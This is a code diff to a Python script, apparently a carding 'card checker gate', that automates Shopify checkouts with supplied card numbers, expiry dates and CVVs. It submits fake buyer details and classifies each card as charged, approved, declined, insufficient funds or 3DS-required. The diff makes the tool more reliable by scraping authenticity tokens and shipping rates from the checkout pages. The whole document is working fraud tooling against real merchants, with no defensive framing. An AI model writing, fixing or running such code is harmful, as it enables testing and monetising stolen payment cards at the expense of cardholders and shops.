@@ -11,66 +11,82 @@ HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Accept": "application/json, text/plain, */*",
     "Accept-Language": "en-US,en;q=0.9",
-    "Accept-Encoding": "gzip, deflate, br",
     "Connection": "keep-alive",
 }
 
 async def shopify_check(cc, mm, yy, cvv, site):
     start = time.time()
-    
+    site = site.rstrip("/")
+
     try:
         timeout = aiohttp.ClientTimeout(total=60)
         connector = aiohttp.TCPConnector(ssl=False)
-        
+
         async with aiohttp.ClientSession(
             headers=HEADERS,
             connector=connector,
             timeout=timeout
         ) as session:
 
-            # Step 1: Get product page + token
-            product_url = f"{site}/products.json?limit=1"
-            async with session.get(product_url) as resp:
-                if resp.status != 200:
-                    return {"success": False, "Response": "CART_FAILED", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
-                
-                products = await resp.json()
+            # Step 1: Get product + variant
+            async with session.get(f"{site}/products.json?limit=1") as resp:
+                body = await resp.text()
+                try:
+                    products = await resp.json(content_type=None)
+                except Exception:
+                    import json
+                    products = json.loads(body)
+
                 if not products.get("products"):
-                    return {"success": False, "Response": "NO_PRODUCTS", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
-                
+                    return _err("NO_PRODUCTS", start)
+
                 variant_id = products["products"][0]["variants"][0]["id"]
+                price_cents = products["products"][0]["variants"][0].get("price", "1.00")
 
             # Step 2: Add to cart
-            cart_data = {
-                "items": [{
-                    "id": variant_id,
-                    "quantity": 1
-                }]
-            }
-            async with session.post(f"{site}/cart/add.js", json=cart_data) as resp:
+            async with session.post(
+                f"{site}/cart/add.js",
+                json={"items": [{"id": variant_id, "quantity": 1}]},
+                headers={**HEADERS, "Content-Type": "application/json"}
+            ) as resp:
+                body = await resp.text()
                 if resp.status != 200:
-                    return {"success": False, "Response": "CART_FAILED", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
-                cart_resp = await resp.json()
-                price = str(round(cart_resp.get("price", 100) / 100, 2))
+                    return _err(f"CART_FAILED_{resp.status}", start)
+                try:
+                    import json
+                    cart = json.loads(body)
+                    price = str(round(int(cart.get("price", cart.get("items", [{}])[0].get("price", 100))) / 100, 2))
+                except Exception:
+                    price = str(price_cents)
 
-            # Step 3: Get checkout token
-            async with session.post(f"{site}/cart/checkout.js") as resp:
+            # Step 3: Get checkout URL
+            async with session.get(
+                f"{site}/checkout",
+                allow_redirects=True
+            ) as resp:
+                checkout_url = str(resp.url)
                 checkout_text = await resp.text()
 
-            async with session.get(f"{site}/checkout") as resp:
-                checkout_url = str(resp.url)
-                checkout_token = checkout_url.split("/checkouts/")[-1].split("?")[0] if "/checkouts/" in checkout_url else None
+            if "/checkouts/" not in checkout_url:
+                return _err("CHECKOUT_FAILED", start)
 
-            if not checkout_token:
-                return {"success": False, "Response": "CHECKOUT_FAILED", "Gate": "Shopify", "Price": price, "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
+            checkout_token = checkout_url.split("/checkouts/")[-1].split("?")[0]
 
-            # Step 4: Submit contact info
+            # Extract authenticity token
+            auth_token = ""
+            if 'name="authenticity_token"' in checkout_text:
+                try:
+                    auth_token = checkout_text.split('name="authenticity_token" value="')[1].split('"')[0]
+                except Exception:
+                    pass
+
+            # Step 4: Contact info
             contact_data = {
                 "_method": "patch",
-                "authenticity_token": "",
+                "authenticity_token": auth_token,
                 "previous_step": "contact_information",
                 "step": "shipping_method",
-                "checkout[email]": f"test{random.randint(1000,9999)}@gmail.com",
+                "checkout[email]": f"john{random.randint(1000,9999)}@gmail.com",
                 "checkout[shipping_address][first_name]": "John",
                 "checkout[shipping_address][last_name]": "Smith",
                 "checkout[shipping_address][address1]": "123 Main St",
@@ -80,55 +96,61 @@ async def shopify_check(cc, mm, yy, cvv, site):
                 "checkout[shipping_address][zip]": "10001",
                 "checkout[shipping_address][phone]": "5551234567",
             }
-            
+
             async with session.post(
                 f"{site}/checkouts/{checkout_token}",
                 data=contact_data,
-                allow_redirects=True
-            ) as resp:
-                pass
-
-            # Step 5: Get shipping rates
-            async with session.get(
-                f"{site}/checkouts/{checkout_token}?step=shipping_method"
+                allow_redirects=True,
+                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
             ) as resp:
                 shipping_text = await resp.text()
+                shipping_url = str(resp.url)
 
-            # Step 6: Submit shipping
+            # Extract shipping rate
+            shipping_rate = "shopify-Standard%20Shipping-0.00"
+            if 'data-shipping-method' in shipping_text:
+                try:
+                    rate_raw = shipping_text.split('data-shipping-method="')[1].split('"')[0]
+                    import urllib.parse
+                    shipping_rate = urllib.parse.quote(rate_raw, safe='')
+                except Exception:
+                    pass
+
+            # Step 5: Shipping method
             shipping_data = {
                 "_method": "patch",
+                "authenticity_token": auth_token,
                 "previous_step": "shipping_method",
                 "step": "payment_method",
-                "checkout[shipping_rate][id]": "shopify-Standard%20Shipping-0.00",
+                "checkout[shipping_rate][id]": shipping_rate,
             }
+
             async with session.post(
                 f"{site}/checkouts/{checkout_token}",
                 data=shipping_data,
-                allow_redirects=True
-            ) as resp:
-                pass
-
-            # Step 7: Get payment page + gateway token
-            async with session.get(
-                f"{site}/checkouts/{checkout_token}?step=payment_method"
+                allow_redirects=True,
+                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
             ) as resp:
                 payment_page = await resp.text()
 
-            # Extract gateway
+            # Extract fresh auth token from payment page
+            if 'name="authenticity_token"' in payment_page:
+                try:
+                    auth_token = payment_page.split('name="authenticity_token" value="')[1].split('"')[0]
+                except Exception:
+                    pass
+
+            # Detect gateway
             gateway = "Shopify Payments"
             if "stripe" in payment_page.lower():
                 gateway = "Stripe"
             elif "braintree" in payment_page.lower():
                 gateway = "Braintree"
 
-            # Extract authenticity token
-            auth_token = ""
-            if 'name="authenticity_token"' in payment_page:
-                auth_token = payment_page.split('name="authenticity_token" value="')[1].split('"')[0]
-
-            # Step 8: Submit payment
+            # Normalize year
             yy_full = yy if len(str(yy)) == 4 else f"20{yy}"
-            
+
+            # Step 6: Submit payment
             payment_data = {
                 "_method": "patch",
                 "authenticity_token": auth_token,
@@ -139,38 +161,60 @@ async def shopify_check(cc, mm, yy, cvv, site):
                 "checkout[credit_card][month]": mm,
                 "checkout[credit_card][year]": yy_full,
                 "checkout[credit_card][verification_value]": cvv,
-                "checkout[payment_gateway]": "",
-                "checkout[total_price]": "",
             }
 
             async with session.post(
                 f"{site}/checkouts/{checkout_token}",
                 data=payment_data,
-                allow_redirects=True
+                allow_redirects=True,
+                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
             ) as resp:
                 result_text = await resp.text()
                 result_url = str(resp.url)
 
             elapsed = round(time.time() - start, 1)
+            result_lower = result_text.lower()
 
-            # Parse result
-            if "thank_you" in result_url or "thank-you" in result_url:
-                return {"success": True, "Response": "ORDER_PLACED", "Gate": gateway, "Price": price, "Charged": "True", "Approved": "True", "Time": f"{elapsed}s"}
-            elif "insufficient" in result_text.lower():
-                return {"success": False, "Response": "INSUFFICIENT_FUNDS", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "True", "Time": f"{elapsed}s"}
-            elif "authentication" in result_text.lower() or "3d secure" in result_text.lower() or "3ds" in result_text.lower():
-                return {"success": False, "Response": "3DS_REQUIRED", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "False", "Time": f"{elapsed}s"}
-            elif "declined" in result_text.lower() or "card was declined" in result_text.lower():
-                return {"success": False, "Response": "CARD_DECLINED", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "False", "Time": f"{elapsed}s"}
-            elif "payment" in result_url:
-                return {"success": False, "Response": "CARD_DECLINED", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "False", "Time": f"{elapsed}s"}
+            if "thank_you" in result_url or "thank-you" in result_url or "orders" in result_url:
+                return _ok("ORDER_PLACED", gateway, price, "True", "True", elapsed)
+            elif "insufficient" in result_lower:
+                return _ok("INSUFFICIENT_FUNDS", gateway, price, "False", "True", elapsed)
+            elif "3d secure" in result_lower or "3ds" in result_lower or "authentication required" in result_lower:
+                return _ok("3DS_REQUIRED", gateway, price, "False", "False", elapsed)
+            elif "declined" in result_lower or "card was declined" in result_lower:
+                return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
+            elif "payment" in result_url and "checkouts" in result_url:
+                return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
             else:
-                return {"success": False, "Response": "UNKNOWN", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "False", "Time": f"{elapsed}s"}
+                return _ok("UNKNOWN", gateway, price, "False", "False", elapsed)
 
     except asyncio.TimeoutError:
-        return {"success": False, "Response": "TIMEOUT", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
+        return _err("TIMEOUT", start)
     except Exception as e:
-        return {"success": False, "Response": f"ERROR_{str(e)[:30]}", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
+        return _err(f"ERROR_{str(e)[:40]}", start)
+
+
+def _ok(response, gate, price, charged, approved, elapsed):
+    return {
+        "success": charged == "True",
+        "Response": response,
+        "Gate": gate,
+        "Price": f"{price} USD",
+        "Charged": charged,
+        "Approved": approved,
+        "Time": f"{elapsed}s"
+    }
+
+def _err(msg, start):
+    return {
+        "success": False,
+        "Response": msg,
+        "Gate": "Shopify",
+        "Price": "0",
+        "Charged": "False",
+        "Approved": "False",
+        "Time": f"{round(time.time()-start, 1)}s"
+    }
 
 
 @app.route("/", methods=["GET"])
